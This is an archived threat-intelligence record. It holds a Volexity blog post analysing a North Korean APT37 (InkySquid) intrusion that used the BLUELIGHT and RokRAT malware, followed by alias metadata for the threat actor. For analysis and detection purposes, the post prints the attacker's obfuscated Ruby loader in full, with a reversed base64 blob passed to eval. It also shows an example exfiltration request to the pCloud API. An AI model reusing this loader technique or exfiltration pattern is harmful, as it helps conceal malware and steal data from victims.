{
    "id": "1fd8bfff-6714-46c5-8e1e-214b8e0024d5",
    "created_at": "2022-10-25T16:48:22.567941Z",
    "updated_at": "2025-03-27T02:16:37.142051Z",
    "deleted_at": null,
    "sha1_hash": "82faf0f8be075ee1f3efaba5089fd9962328811f",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-08-25T06:32:20Z",
    "file_modification_date": "2021-08-25T06:32:20Z",
    "file_size": 606538,
    "plain_text": "## BLOG\n\n# North Korean BLUELIGHT Special: InkySquid Deploys RokRAT\n\n### AUGUST 24, 2021\n\n by Damien Cash, Josh Grunzweig, Steven Adair, Thomas Lancaster\n\n   \n\n[In a recent blog post, Volexity disclosed details on a portion of the operations by a North Korean](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)\n\nthreat actor it tracks as InkySquid. This threat actor compromised a news portal to use recently\n\npatched browser exploits to deliver a custom malware family known as BLUELIGHT.\n\nThis follow-up post describes findings from a recent investigation undertaken by Volexity in which\n\n[the BLUELIGHT malware was discovered being delivered to a victim alongside RokRAT (aka](https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat)\n\n[DOGCALL). RokRAT is a backdoor previously attributed to use by ScarCruft/APT37, which is also](https://attack.mitre.org/software/S0213/)\n\nknown as InkySquid. It should be noted that Volexity identified some overlap between the findings\n\n[discussed in this post and this Korean-language article.](https://medium.com/s2wlab/matryoshka-variant-of-rokrat-apt37-scarcruft-69774ea7bf48)\n\n\n-----\n\n# Analysis\n\nVolexity is often asked to analyze systems of users frequently targeted by state-sponsored threat\n\nactors based on some tip-off or concern that the systems may be compromised. In this case, it\n\nwas a system belonging to an individual who is a frequent target of North Korean threat actors.\n\nPrior to contacting Volexity, the user had run four separate, popular antivirus programs in\n\n#### attempts to identify and remove any malware. Despite these actions, the user was still\n\n concerned that their machine may have been infected. Despite less-than-ideal conditions\n\n for the starting analysis state, Volexity was able to identify two separate malware infections\n\n on the system, and a likely start date for the infection. However, it was not possible to\n\n confirm how it became infected, as it had been rebooted multiple times since initial\n\n infection and several weeks had passed.\n\nThe first malware discovered was installed using a convoluted loading mechanism, where a full\n\ncopy of Python 2.7 was installed into the following directory:\n```\n %USERPROFILE%/Python27(64)\n\n```\nAn encoded blob was then stored in the following location:\n```\n %PROGRAMDATA%/hiddigi/msihnd\n\n```\nA loading script written in Python was written to the following directory:\n```\n %LocalAppData%/Microsoft/mdmadc/KBDBGPH1\n\n```\nFollowing this, the attacker configured a Scheduled Task to use the Python binary to run the\n\nloading script and execute the encoded blob. The script decoded a shellcode stub at the head of\n\nthe msihnd file, which is responsible for setting up a child process using the name of a randomly\n\nchosen EXE file from the \"C:\\Windows\\System32\" directory. The main malware was then decoded\n\nfrom data stored after the initial shellcode, using a single-byte XOR key of 0x74. The result of this\n\nprocess was that a version of the BLUELIGHT malware family would be loaded. While the sample\n\n[of BLUELIGHT analyzed in the previous post used Microsoft Graph for command and control, this](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)\n\nversion used a custom Google Web App.\n\n\n-----\n\nThe loading mechanism for this family was similar to that used for BLUELIGHT; although this time,\n\na copy of Ruby was installed at the following path:\n```\n %LOCALAPPDATA%/Microsoft/Ruby27-x64/\n\n```\nThe attacker dropped two encoded blobs to the following locations:\n```\n %PROGRAMDATA%/User-Mode Bus Enumerator/1BA76030/Shortcut_674D.info\n %PROGRAMDATA%/Local Kernel Debugger/18E911AC/WinSDK_4641.info\n\n```\nA loading script, written in Ruby, was saved to the following location and set to run as a Scheduled\n\nTask:\n```\n %PROGRAMDATA%/Microsoft Basic Display Driver/57D45646/Readme.io.md\n\n```\nThe Ruby loading script was made to appear as though it were a real system file, with comments\n\nindicating it was part of the operating system. The malicious content is encoded within a URL\n\nstring, as shown in the Ruby script below:\n\n\n-----\n\n```\n# 14:21:58 27/02/2004\n# Copyright (c) Microsoft Corporation. All\nrights reserved.\nrequire 'base64'\nrequire 'fiddle/import'\n# Update\nDriver: name=Microsoft Basic Display Driver, id=289A1260\nurl7d37 =\n'https://update.microsoft.com/driverupdate?\nid=K0AM3YEMjoQD7kCMxoCM2oCMwATMgwCZhVmcoRHK0NWZqJ2Tlx2Zul2Uy9mR0lWYXpjO\nyMDbl5mcltkCNsTKwACLwACLwACLyRHcgwCMgwCMoQWYlJHaUVGdhVmcDpjOyMDbl5mcltE\nI9ACZhVmcoRnCNsTKlpXaz5CZwV3YzBCLmVnYgwic0BHK5J3btVWTlZ3bNxGdSpjOyMDbl5\nmcltkCNQmblpQD7kXZrBiXg0VabZWdiBSPg0FdlNnZm9mcpZWLptlZ1JGIgoQDvRGIlpXaz\n5CZwV3Yz5iL0V2cmZ2bylmZg4WagkGIy9mZK0wO2sSXwslZ1JGI9ACdlNnZm9mcpZmCNsTX\ndBzWmVnYrEzWmVnYg0DI5V2aK0QQCV0MjoQD70FZwV3YztlclRnbp9GU6oTZsRGZpZEI9Ai\nZ1JmCNsTKwACLwACLwADN4BDIrASZ6l2cuQGc1N2cgwic0BHK0NWZ09mcQxWY1RncpZlO6I\nzMsVmbyV2SK0wOpADN4BDIsADMwMDewACLwADN4BDIrASZ6l2cuQGc1N2cgwCMoM2bsxWQs\nFWd0JXaWpjOyMDbl5mcltEI9Aic0BnCNsTZz9Gbj5SZslmZjNnCNsDZhVmcuUGbpZ2YzBSP\ngQGc1N2cK0wOpIiYyJCLi8mZulmLERzN28Fd1NGdy9GaTxFXwMDM2cTQCFDXcJ3b0Fmcl1W\nduVEIzVnQgUGZv1ULyV2cVxFXhRXYE1WYyd2byBFXcpzQigiblB3buUGbpZEI9ASZslmZjN\nnCNsTKnQXa4VEIuECZuV3bGBCdv5EIlxWaGdCKzRXdwpQDk5WZK0QMCRENjACIK0wJpcmbv\nxGIkVmbnl2cuVHIsoCZp9mdoQ3YlpmYPVGbn5WaTJ3bGRXahdFI05WagQWZudWaz5WdnAib\nyVGd4VGIgoQDnkiKn52bsBCZl52ZpNnb1BCLn52bsBCZl52ZpNnb1BCLqQWavZHIsoCZp9m\ndgwCVfVkWJNFIsoCZp9mdoQWYlJHaUVGdhVmcDBiKkl2b2dCIuJXZ0hXZgAiCNcSKU9VRal\n0UgwiKkl2b2BCLqQWavZHK5J3btVWTlZ3bNxGdSBCZp9mdnAibyVGd4VGIgoQDnkiKn52bs\nBCZl52ZpNnb1BCLn52bsBCZl52ZpNnb1BCLU9VRal0UgwiKkl2b2hCdjVGdvJHUsFWd0JXa\nWBCdul2Jg4mclRHelBCIK0wJpcmbvxGIkVmbnl2cuVHIscmbvxGIkVmbnl2cuVHIsQ1XFpV\nSTBCLqQWavZHKj9GbsFEbhVHdylmVgoCZp9mdnAibyVGd4VGIgoQDncmbvxGIn52bsBCZl5\n2ZpNnb1dCIscCVfVkWJN1JgMXYpxWYlBXe0BCIK0QOCNkMjACIK0wJyMDbl5mclt2JgQWYv\nxGbkBCIK0gclRncvBXbJpjOlxGZklmRgQmblRHelBCIK0gMzwWZuJXZLBSZsVHZv1mCNYDO\n0AzI';\nalias UrlFilter1462 eval;\n# UrlFilter: id=74F51EE8\nUrlFilter1462(Base64.decode64(url7d37[45..-1].reverse));\n\n```\n\nThe effect of this script is to reverse the content after “id=” in the URL and base64 decode it,\n\nyielding the real script’s true intent: to decrypt the previously written Shortcut_674D.info file using\n\na simple XOR operation.\n\nAfter the Shortcut_674D.info file is decrypted, it is executed within a new thread. This data acts as\n\nshellcode that seeks out and decrypts an embedded blob of data using a mix of ROL and XOR\n\noperations. After decryption, an executable file remains and is then run.\n\n\n-----\n\nloader uses the hostname of the current system to decrypt the embedded payload. Therefore, if it\n\nis run on any system other than the one intended, the malware will fail to execute. This trait\n\nillustrates that the malware is customized; it was created specifically for the exact victim system\n\non which it was discovered.\n\n[If decryption of the payload is successful, the final payload is an instance of the RokRAT malware](https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat)\n\nfamily with the following properties:\n\nSHA256 19ee7d139908a889d08508dd4225f2d27958ac2c8b7ff18a97507f7de8ce79bc\n\nSHA1 ff080176ab9e51ace68dbe3a56629168b41fa1fc\n\nMD5 9d2e5f9274b25740131f3b6139e3c3ce\n\nFile Type Win64 EXE\n\nCompile Time 2021:05:25 02:20:44+01:00\n\nMuch like BLUELIGHT, this malware family uses cloud services for all communications, supporting\n\n**PCloud, Yandex, Dropbox, and Box for command and control. The API keys for this**\n\ncommunication are embedded within the malware itself. The malware is able to perform a\n\nnumber of functions, including but not limited to the following:\n\nKeylogging and extraction of clipboard data\n\nCollection of specific filetypes\n\nDownload/execute further payloads\n\nExfiltrated data is encrypted using an RSA public key, preventing third parties from decrypting it.\n\nAn example exfiltration request is below:\n\n|SHA256|19ee7d139908a889d08508dd4225f2d27958ac2c8b7ff18a97507f7de8ce79bc|\n|---|---|\n|SHA1|ff080176ab9e51ace68dbe3a56629168b41fa1fc|\n|MD5|9d2e5f9274b25740131f3b6139e3c3ce|\n|File Type|Win64 EXE|\n|Compile Time|2021:05:25 02:20:44+01:00|\n\n\n-----\n\nPOST /uploadfile?path=/1&filename=202106221534400000.q00&nopartial=1 HTTP/1.1\n\nConnection: close\n\nContent-Type: multipart/form-data;boundary=--wwjaughalvncjwiajs-\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.8\n\nAuthorization: Bearer PpmL7Z9qHXPhLX38[TRUNCATED]kuk7HTet3AWYjwvAhuB\n\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\n\nContent-Length: 71795\n\nHost: api.pcloud.com\n\n----wwjaughalvncjwiajs-\nContent-Disposition: form-data; name=\"file\"; filename=\"202106221534500000.q00\"\n\nContent-Type: voice/mp3\n\n[DATA]\n\nMuch like its loader, this copy of RokRAT uses the victim’s hostname for decryption of important\n\nstrings; it will fail to execute properly if the correct hostname is not present on the machine on\n\nwhich it is run. Additionally, strings within the malware referenced specific file paths that resided\n\non the victim’s system. Presumably these paths were discovered by the attacker while running\n\ncommands using BLUELIGHT, meaning the sample was compiled \"live\" following initial\n\nreconnaissance on the victim's system.\n\n# Conclusion\n\nRokRAT is a closed-source malware family believed to be used exclusively by the North Korean\n\n[APT37 threat actor, which Volexity tracks as InkySquid. The threat actor has attracted little public](https://malpedia.caad.fkie.fraunhofer.de/actor/apt37)\n\nattention in the last year and a half. In this case, Volexity was able to tie the new BLUELIGHT\n\n[malware family observed in the incident described in the previous post to APT37 based on the use](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)\n\nof RokRAT malware, since they were observed being deployed sequentially during the intrusion.\n\nBoth the BLUELIGHT malware family and RokRAT use cloud services for command and control,\n\nmaking network-based detection more difficult. Additionally, while the installation of full copies of\n\nscripting languages such as Ruby and Python is noisy, they are cleverly used to obfuscate the\n\nactual malware which remains encoded on disk and is only truly visible in memory.\n\n\n-----\n\nVolexity’s investigation. None detected the presence of either the RokRAT or BLUELIGHT malware\n\nfamilies, showing the effectiveness of these techniques to load these malware families to evade\n\ndetection.\n\nTo prevent similar attacks from being effective against your organization, Volexity recommends\n\nthe following:\n\nIf enterprise users do not require access to cloud storage resources, consider blocking them\n\nas they are difficult to detect from a command-and-control perspective.\n\nConsider monitoring for and alerting on new scheduled tasks containing unusual\n\narguments, particularly scripting language-based scheduled tasks.\n\nTo prevent these specific attacks from being successful:\n\n[Use the YARA rules provided here to identify related malware.](https://github.com/volexity/threat-intel/blob/main/2021/2021-08-24%20-%20InkySquid%20Part%202/indicators/yara.yar)\n\nBlock the Google App domain “636478154616\nbt8kmnrg1l6oml3ipv7ifc6bck0in18h.apps.googleusercontent.com”.\n\n### APT, APT37, BLUELIGHT, DPRK, InkySquid, North Korea, RokRAT\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.08.24.NK_APT_InkySquid_RokRAT/volexity.com-North%20Korean%20BLUELIGHT%20Special%20InkySquid%20Deploys%20RokRAT.pdf"
    ],
    "report_names": [
        "volexity.com-North Korean BLUELIGHT Special InkySquid Deploys RokRAT"
    ],
    "threat_actors": [
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1629873140,
    "ts_modification_date": 1629873140,
    "files": {
        "pdf": "https://archive.orkl.eu/82faf0f8be075ee1f3efaba5089fd9962328811f.pdf",
        "text": "https://archive.orkl.eu/82faf0f8be075ee1f3efaba5089fd9962328811f.txt",
        "img": "https://archive.orkl.eu/82faf0f8be075ee1f3efaba5089fd9962328811f.jpg"
    }
}